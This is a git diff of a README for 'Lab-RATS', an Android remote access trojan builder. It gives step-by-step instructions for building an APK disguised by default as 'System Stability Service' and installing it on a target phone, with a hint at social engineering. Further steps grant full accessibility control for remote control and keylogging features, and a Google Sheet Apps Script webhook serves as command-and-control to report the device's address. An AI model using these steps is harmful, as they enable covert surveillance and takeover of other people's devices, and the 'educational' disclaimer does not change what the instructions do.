@@ -93,47 +93,10 @@ The built-in shell has been overhauled for professional workflows:
 
 ---
 
-## 🛠️ Getting Started
+## 📊 Google Sheet Setup Instructions (v1.4.5)
 
-### 1. Requirements:
-*   **Java 11 or 21** installed on your **workstation**.
-*   📱 A **target Android** device *(Samsung/Pixel/OnePlus supported)*.
-*   A **Google Sheet Webhook URL** for IP tracking.
-
-### 2. Build the APK: (on PC)
-1.  **Download & Extract** the repository.
-2.  Navigate to `cd /Lab-RATS-main/apk-builder/`
-3.  **Execute** the builder: chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
-4.  Enter your **App name** (Default: *System Stability Service*) and **Google Sheet URL**. *(Google Sheet setup instructions below)*
-4.  Retrieve your `signed.apk` from the `/apk-builder/output/` directory.
-
-### 3. Install APK onto Target Device
-1.  **Install** the `signed.apk` onto the **Target Android device**.
-> ** *If you have access to the device, turn on USB debugging (developer settings), plug into a PC and run `adb install signed.apk`. If not get creative on how to install Android `.apk` files onto devices.(Social Engineering?....etc)*
-
-2.  Once the App is installed on **Target Device**, **ALL permissions must be granted to the App**, then tap the **"Initialize Server"** button.
-3.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
-4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target device**.
-> **Note** - *To use "Ghost features", navigate to the Ghost Tab on the Web C2 Panel and click "Open Accessibility Settings".*
-
-[![Accessibilities-Perm.png](https://i.postimg.cc/yxrwkRPD/Accessibilities-Perm.png)](https://postimg.cc/bSk65s4P)
-
-> *This opens the accessibility menu on the Target device, tap "Installed Apps".*
-
-<a href="https://postimg.cc/Bt7QZtLs" target="_blank"><img src="https://i.postimg.cc/Bt7QZtLs/Accessibility-Menu.png" alt="Accessibility-Menu"></a>
-
-> *Toggle permission on, then tap "Allow"  to permit full control of device.*
-
-<a href="https://postimg.cc/TynppG8y" target="_blank"><img src="https://i.postimg.cc/TynppG8y/Accessibility-allow.png" alt="Accessibility-allow"></a>
-
-> ** *This ONLY applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". ALL other features can be used without this permission.*
-
----
-
-## 📊 Google Sheet C2 Setup Instructions (Advanced v1.4)
-
-1.  **Create** a new **Google Sheet**.
-2.  Go to **Extensions** → **Apps Script** and **paste this Hybrid Snippet:** *(Supports both GET and POST)*
+1.  **Create** a new **Google Sheet** for **IP Tracking**.
+2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:** *(Supports both GET and POST)*
 
 ```javascript
 function doGet(e) {
@@ -188,12 +151,60 @@ function handleRequest(e) {
   }
 }
 ```
-3.  **Deploy** → **New Deployment** → **Web App** → **Execute as Me** → **Who has access: Anyone**.
-4.  **Important**: **Copy the Web App URL** and **paste it** into the **apk-builder** tool when prompted.
+3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-mail)* → **Who has Access: Anyone**.
+4.  **Important**: **Copy** the **Google Sheet Webhook URL** and prepare to **Paste it** into the **apk-builder** tool **when prompted**. *(Next Section)*
 
-### 📊 Example Google Sheet Configured:
+---
 
-[![Google-Sheet-Example.png](https://i.postimg.cc/L6qYMSZr/Google-Sheet-Example.png)](https://postimg.cc/56VNwZg3)
+## 🛠️ Getting Started
+
+### 1. Requirements
+*   **Java 11 or 21** installed on your **workstation**.
+*   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus supported)*
+*   Your **Google Sheet Webhook URL**. *(Previous Section)*
+
+### 2. Building the APK (on PC)
+1.  **Download & Extract** the repository.
+2.  **Navigate** to `cd /Lab-RATS-main/apk-builder/`
+3.  **Execute** the builder: `chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
+4.  Enter your **App name** (Default: *System Stability Service*), **SDK Version, Logo** etc.. or just use defaults.
+5.  Enter your **Google Sheet Webhook URL from previous section**. *(If not yet created, Google Sheet setup instructions above)*
+6.  Retrieve your `signed.apk` from the `/apk-builder/output/` directory.
+
+### 3. Installing APK/App onto Android Device
+1.  **Install** the `signed.apk` onto the **Android device**.
+> ** **Important** - If you can access the device sideload the `signed.apk` by turning on USB debugging in developer settings, plugging into PC and running `adb install signed.apk`. If not get creative on installing Android `.apk` files onto devices.
+2.  Once the APK/app is installed onto the **Android Device**, **ALL permissions must be granted**, then tap the **"Initialize Server"** button.
+3.  The **Server** will go online and the **Active C2 Interface URL** should **pop up instantly** on your **Google Sheet**. *(Configured Google Sheet Example below)*
+
+**📊 Google Sheet Example**:
+
+<a href='https://postimg.cc/1nDbNCMq' target='_blank'><img src='https://i.postimg.cc/1nDbNCMq/Google-sheet-example.png' border='0' alt='Google-sheet-example'></a>
+
+> ** **Important** - *To use "Ghost features", navigate to the Ghost Tab in the active C2 interface and click "Open Settings".*
+
+[![Accessibilities-Perm.png](https://i.postimg.cc/yxrwkRPD/Accessibilities-Perm.png)](https://postimg.cc/bSk65s4P)
+
+> ** - *This opens the accessibility menu on the Android device, tap "Installed Apps".*
+
+<a href='https://postimg.cc/Bt7QZtLs' target='_blank'><img src='https://i.postimg.cc/Bt7QZtLs/Accessibility-Menu.png' border='0' alt='Accessibility-Menu'></a>
+
+> ** - *Toggle permission on, then tap "Allow" to permit full control of device.*
+
+<a href='https://postimg.cc/TynppG8y' target='_blank'><img src='https://i.postimg.cc/TynppG8y/Accessibility-allow.png' border='0' alt='Accessibility-allow'></a>
+
+> ** - *This ONLY applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". ALL other features can be used without this permission.*
+
+4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Android device**.
+
+---
+
+## ⭐ Support the Development
+
+If you find **Lab-RATS** awesome and useful for your **security research**, **please Star ⭐ the project**—it drives **further development!!**
+
+### Contributions:
+**Bug reports, add new feature** and **pull requests** are **always welcome**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO-LABS/Lab-RATS/CONTRIBUTING.md) for more info)*
 
 ---
 
@@ -357,6 +368,3 @@ This tool is for **educational and authorized testing purposes.** The **develope
 
 © 2026 **K4N3CO.LABS**
 
----
-
-© 2026 **K4N3CO.LABS**
